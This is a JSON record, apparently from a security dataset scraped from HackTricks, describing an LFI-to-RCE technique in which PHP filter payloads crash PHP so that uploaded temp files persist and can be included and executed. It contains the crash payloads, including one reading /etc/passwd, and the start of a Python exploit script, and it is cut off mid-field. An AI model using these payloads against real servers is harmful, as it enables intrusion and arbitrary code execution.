{
  "id": "pentesting_web_73276ded90e7",
  "category": "pentesting-web",
  "title": "lfi2rce via segmentation fault",
  "description": "# LFI2RCE via Segmentation Fault\n\n{{#include ../../banners/hacktricks-training.md}}\n\nAccording to the writeups [https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/](https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/) (second part) and [https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view), the following payloads caused a segmentation fault in PHP:\n\n```php\n// PHP 7.0\ninclude(",
  "payloads": [
    "# LFI2RCE via Segmentation Fault",
    "{{#include ../../banners/hacktricks-training.md}}",
    "According to the writeups [https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/](https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/) (second part) and [https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view), the following payloads caused a segmentation fault in PHP:",
    "```php",
    "// PHP 7.0",
    "include(\"php://filter/string.strip_tags/resource=/etc/passwd\");",
    "// PHP 7.2",
    "include(\"php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA\");",
    "You should know that if you **send** a **POST** request **containing** a **file**, PHP will create a **temporary file in `/tmp/php<something>`** with the contents of that file. This file will be **automatically deleted** once the request was processed.",
    "If you find a **LFI** and you manage to **trigger** a segmentation fault in PHP, the **temporary file will never be deleted**. Therefore, you can **search** for it with the **LFI** vulnerability until you find it and execute arbitrary code.",
    "You can use the docker image [https://hub.docker.com/r/easyengine/php7.0](https://hub.docker.com/r/easyengine/php7.0) for testing.",
    "```python",
    "# upload file with segmentation fault",
    "import requests",
    "url = \"http://localhost:8008/index.php?i=php://filter/string.strip_tags/resource=/etc/passwd\""
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault.md"
  ]
}